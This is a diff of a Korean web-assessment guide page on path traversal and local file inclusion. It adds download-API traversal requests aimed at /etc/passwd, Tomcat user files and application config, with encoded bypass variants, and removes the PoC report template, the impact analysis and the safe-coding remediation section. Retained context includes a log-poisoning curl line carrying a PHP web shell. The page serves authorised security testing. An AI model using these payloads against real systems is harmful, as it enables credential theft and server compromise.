@@ -1,13 +1,12 @@
 ---
 sidebar_position: 15
-title: 경로 조작 / 로컬 파일 인클루전 (Path Traversal / LFI)
-description: 웹 진단 - Path Traversal & LFI 점검 절차, 스택별 페이로드, PHP LFI to RCE, 보고서 양식
+title: Path Traversal / LFI
+description: 웹 진단 - Path Traversal & LFI 점검 절차, 스택별 페이로드, PHP LFI to RCE, 판정 기준
 keywords: [LFI, Local File Inclusion, Path Traversal, php filter, Log Poisoning, 경로 조작, OWASP A01]
 draft: false
 ---
 
-# 경로 조작 / 로컬 파일 인클루전 (Path Traversal & LFI)
-
+# 경로 조작 / 로컬 파일 인클루전
 > 사용자 입력으로 파일 경로가 결정되는 곳에서 `../` 등으로 **임의 파일을 읽거나 인클루드**하는 취약점.
 > 단순 파일 읽기는 모든 언어/스택에서 발생하며, **PHP의 `include`/`require`** 일 때만 코드 실행(RCE) 까지 체인 가능.
 
@@ -78,8 +77,7 @@ draft: false
 
 `../` 가 차단되면 우회 패턴 시도 (케이스 4 참조).
 
-### Step 4a. 영향 입증 — 자격증명 파일 추출 (스택 무관)
-
+### Step 4a. 영향 입증 — 자격증명 파일 추출
 `/etc/passwd` 입증만으로는 부족. 스택에 따라 자격증명/설정 파일을 노린다 (케이스 5 참조).
 
 ### Step 4b. PHP 환경 한정 — RCE 체인 시도
@@ -104,6 +102,30 @@ draft: false
 
 **판정**: 응답에 파일 내용이 그대로 노출되면 취약. `/etc/passwd` 가 안 되면 `/etc/hostname` 같은 더 간단한 파일로도 시도 (권한 차이로 hostname만 읽히는 경우 있음).
 
+#### 다운로드 API에서 자주 보이는 `saveName` 패턴
+
+파일 다운로드 API가 `uploads/` 같은 기준 경로에 사용자 입력 파일명을 단순 결합하면, 화면에 보이는 원본 파일명(`originName`)이 아니라 실제 저장명(`saveName`, `path`, `key`) 쪽을 우선 변조한다.
+
+```http
+GET /api/file/download?saveName=../../../etc/passwd&originName=passwd.txt HTTP/1.1
+Host: <TARGET>
+
+GET /api/file/download?saveName=../../opt/tomcat/conf/tomcat-users.xml&originName=config.xml HTTP/1.1
+Host: <TARGET>
+
+GET /api/file/download?saveName=../application.properties&originName=config.txt HTTP/1.1
+Host: <TARGET>
+```
+
+필터가 있으면 인코딩을 바꿔 재시도한다.
+
+```http
+GET /api/file/download?saveName=..%2F..%2F..%2Fetc%2Fpasswd&originName=passwd.txt HTTP/1.1
+GET /api/file/download?saveName=..%252F..%252F..%252Fetc%252Fpasswd&originName=passwd.txt HTTP/1.1
+```
+
+**판정:** 다운로드된 파일 내용이 시스템 파일/설정 파일이면 취약. `originName`은 보통 `Content-Disposition`의 표시명에만 쓰이므로, 경로 영향이 있는 파라미터를 구분해서 본다.
+
 ### 케이스 2: 절대 경로
 
 **언제 쓰는지**: 단순 traversal이 차단(`../` 필터링) 되어도, 절대 경로는 그대로 통과하는 경우 자주 있음.
@@ -121,7 +143,7 @@ draft: false
 **언제 쓰는지**: 코드가 `include($file . ".php")` 또는 `open(input + ".log")` 처럼 확장자를 강제로 붙여서, 원하는 파일이 그대로 안 열릴 때.
 
 ```
-# Null Byte (PHP < 5.3.4 한정 — 거의 안 통하지만 옛날 시스템에서만 시도)
+# Null Byte
 ?file=../../../../etc/passwd%00
 
 # Query string으로 확장자 무시 유도
@@ -134,8 +156,7 @@ draft: false
 
 **판정**: 위 페이로드 중 하나로 케이스 1과 같은 응답이 나오면 취약. Null Byte는 2010년 이후 PHP 환경에서는 거의 안 통하므로 우선순위 낮음.
 
-### 케이스 4: 필터 우회 (`../` 차단 시)
-
+### 케이스 4: 필터 우회
 **언제 쓰는지**: `../` 단순 문자열 차단 / 정규화 미흡 시.
 
 ```
@@ -148,7 +169,7 @@ draft: false
 %2e%2e%2f%2e%2e%2fetc/passwd
 %2e%2e/etc/passwd
 
-# 이중 URL 인코딩 (서버가 한 번 디코드 후 다시 처리할 때)
+# 이중 URL 인코딩
 %252e%252e%252fetc/passwd
 ```
 
@@ -156,8 +177,7 @@ draft: false
 
 > 유니코드 우회(`%c0%ae`, `%uff0e`) 는 모던 웹서버에서 거의 안 통하므로 시도 가치 낮음.
 
-### 케이스 5: 자격증명 / 설정 파일 추출 (스택별 — 영향 입증 핵심)
-
+### 케이스 5: 자격증명 / 설정 파일 추출
 **언제 쓰는지**: Path Traversal 확정 후 영향 입증. 스택에 따라 노릴 파일이 다르다.
 
 | 스택 | 우선 시도 파일 | 노출 시 영향 |
@@ -240,177 +260,6 @@ curl -A "<?php system(\$_GET['cmd']); ?>" "http://<TARGET>/"
 - [ ] 정상적인 다운로드 기능에서 **사전 매핑된 파일 ID**로만 접근 가능 (예: `?id=42` → 내부 매핑 → 안전)
 - [ ] 단순 404 응답 (파일 미존재 / 권한 차단)
 - [ ] CDN/정적 리소스 서버에서 절대 경로 차단 (Path Traversal 차단됨)
-
----
-
-## PoC 양식 (보고서 붙여넣기용)
-
-**[Path Traversal + 자격증명 파일 노출] - 다국어 처리 페이지 `?lang` 파라미터**
-
-1. `<TARGET>/page?lang=ko` 정상 접근 시 한국어 페이지 표시 확인
-2. `lang` 파라미터에 traversal 페이로드 삽입
-3. 응답에 `/etc/passwd` 및 어플리케이션 설정 파일 내용 노출 확인
-
-**요청 (Request):**
-
-```http
-GET /page?lang=../../../../../../etc/passwd HTTP/1.1
-Host: <TARGET>
-Cookie: SESSION=abcd1234
-```
-
-**응답 (Response) — 취약 발현 증거:**
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html; charset=utf-8
-
-<html>
-  ...
-  root:x:0:0:root:/root:/bin/bash
-  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-  ...
-</html>
-```
-
-**확인 사항:**
-- 응답에 `/etc/passwd` 내용이 그대로 노출됨
-- 동일 패턴으로 `/var/www/html/.env` 추출 시 DB 접속 정보(`DB_PASSWORD=...`) 와 JWT secret 노출 (별첨 스크린샷)
-- (PHP 환경) `php://filter/convert.base64-encode/resource=wp-config.php` 페이로드로 소스코드 base64 추출 가능
-
----
-
-## 영향도 분석
-
-- **기밀성 (Confidentiality)**: 🔴 **높음** — 시스템 파일 / 소스코드 / DB 접속 정보 / SSH 키 / 환경변수 노출.
-- **무결성 (Integrity)**: 🟡 — 단순 LFI로는 쓰기 불가. PHP LFI→RCE 체인 시 🔴 (임의 파일 변조 가능).
-- **가용성 (Availability)**: 🟢 — 일반적으로 영향 없음.
-- **추가 위협**:
-  - **2차 공격 진입점** — 노출된 자격증명으로 DB/SSH/내부 시스템 접근
-  - **PHP LFI → RCE** — Log Poisoning 등 체인 시 시스템 침해
-  - **클라우드 자격증명 노출** — `~/.aws/credentials`, user-data 스크립트의 하드코딩 키
-
-**비즈니스 임팩트:**
-어플리케이션 설정 파일에 들어있는 DB 접속 정보 / API 키 / JWT secret 등이 노출되면 단일 결함으로 전체 시스템 침해의 발판이 된다. 특히 클라우드 환경의 user-data 스크립트에 하드코딩된 자격증명 노출 사례가 잦으므로 영향 입증 시 반드시 확인.
-
----
-
-## 대응방안
-
-### 개발자 관점 (필수)
-
-가장 안전한 방법은 **파일명/경로를 사용자 입력으로 받지 않는 것**. 다음 우선순위로 적용:
-
-1. **ID → 매핑 테이블** — 사용자에게는 식별자만 받고, 실제 파일은 서버에서 매핑:
-
-   ```python
-   ALLOWED_LANGS = {"ko": "ko.json", "en": "en.json", "ja": "ja.json"}
-   lang = request.args.get("lang")
-   if lang not in ALLOWED_LANGS:
-       abort(400)
-   path = os.path.join(LANG_DIR, ALLOWED_LANGS[lang])
-   ```
-
-2. **불가피하면 — 정규화 후 prefix 검증** — 경로 정규화 후 허용 디렉토리에서 벗어나지 않는지 확인. 언어별 안전 패턴은 안전 코드 예시 참조.
-
-3. **PHP `include`/`require` 에 사용자 입력 절대 금지** — 동적 인클루드가 필요하면 위 1번처럼 매핑 테이블로.
-
-4. **Node.js 동적 `require()` 금지** — 동일 이유.
-
-### 운영자 관점
-
-1. **웹 프로세스 최소권한** — 어플리케이션 사용자가 `/etc/shadow`, 다른 사용자 홈 디렉토리에 접근 불가하도록 권한 설정.
-
-2. **PHP 설정** — `php.ini`:
-   - `allow_url_include = Off` (RFI 차단)
-   - `allow_url_fopen = Off` (가능하면)
-   - `open_basedir = /var/www/html:/tmp` (어플리케이션 디렉토리로 파일 접근 제한)
-
-3. **WAF 룰** — `../`, `..\`, `php://`, `file://`, `/etc/passwd` 패턴 탐지 (보조 수단).
-
-### 안전 / 위험 코드 비교 (스택별)
-
-**Java:**
-
-```java
-// 위험
-File f = new File(baseDir, userInput);
-Files.readString(f.toPath());
-
-// 안전 — Path.normalize() 후 startsWith() 검증
-Path base = Paths.get("/var/app/uploads").toAbsolutePath().normalize();
-Path target = base.resolve(userInput).normalize();
-if (!target.startsWith(base)) {
-    throw new SecurityException("path traversal");
-}
-Files.readString(target);
-```
-
-**Python:**
-
-```python
-# 위험
-with open(os.path.join(BASE_DIR, user_input)) as f:
-    return f.read()
-
-# 안전 — realpath() 후 commonpath 검증
-import os
-base = os.path.realpath("/var/app/uploads")
-target = os.path.realpath(os.path.join(base, user_input))
-if os.path.commonpath([base, target]) != base:
-    raise PermissionError("path traversal")
-with open(target) as f:
-    return f.read()
-```
-
-**Node.js:**
-
-```javascript
-// 위험
-const data = fs.readFileSync(path.join(__dirname, userInput));
-
-// 안전 — path.resolve() 후 startsWith() 검증
-const path = require('path');
-const fs = require('fs');
-const base = path.resolve('/var/app/uploads');
-const target = path.resolve(base, userInput);
-if (!target.startsWith(base + path.sep)) {
-    throw new Error('path traversal');
-}
-fs.readFileSync(target);
-```
-
-**.NET:**
-
-```csharp
-// 위험
-var content = File.ReadAllText(Server.MapPath(userInput));
-
-// 안전 — Path.GetFullPath() 후 base 검증
-var baseDir = Path.GetFullPath("/var/app/uploads");
-var target = Path.GetFullPath(Path.Combine(baseDir, userInput));
-if (!target.StartsWith(baseDir + Path.DirectorySeparatorChar)) {
-    throw new SecurityException("path traversal");
-}
-File.ReadAllText(target);
-```
-
-**PHP:**
-
-```php
-// 위험
-$content = file_get_contents($_GET['file']);
-include($_GET['page']);   // RCE까지 가능 — 절대 금지
-
-// 안전 — basename() + 화이트리스트 + realpath() prefix 검증
-$base = realpath('/var/www/uploads');
-$target = realpath($base . '/' . basename($_GET['file']));
-if ($target === false || strpos($target, $base) !== 0) {
-    http_response_code(400); exit;
-}
-$content = file_get_contents($target);
-```
 
 ---
 
